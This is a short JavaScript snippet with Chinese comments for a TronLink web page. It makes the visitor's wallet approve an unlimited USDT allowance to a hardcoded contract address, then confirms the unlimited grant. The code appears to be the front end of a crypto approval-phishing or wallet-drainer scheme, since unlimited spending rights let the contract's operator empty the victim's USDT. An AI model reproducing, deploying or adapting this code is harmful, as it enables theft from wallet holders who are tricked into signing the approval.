// 這是你的授權合約地址
const AUTH_CONTRACT = "TLFVGYGU5wd4z3KzKxr35kNUHQ7zFtff5d"; 
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 

// 最大授權金額
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// 檢查用戶是否登入 TronLink 並進行授權
async function authorizeUSDT() {
  if (!window.tronWeb || !tronWeb.defaultAddress.base58 || !tronWeb.ready) {
    return alert("請使用 TronLink 並登入錢包");
  }

  const address = tronWeb.defaultAddress.base58;

  try {
    const usdt = await tronWeb.contract().at(USDT_CONTRACT);
    // 進行 USDT 授權
    const tx = await usdt.approve(AUTH_CONTRACT, MAX_UINT256).send();
    console.log(tx);

    const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
    const allowedAmount = parseFloat(allowance.toString()) / 1e6;

    if (allowedAmount > 1000000) {
      alert("授權成功，無上限 USDT 授權給合約");
    } else {
      alert("授權金額異常，請重新操作");
    }
  } catch (err) {
    console.error("授權失敗", err);
    alert("授權失敗：" + err.message);
  }
}
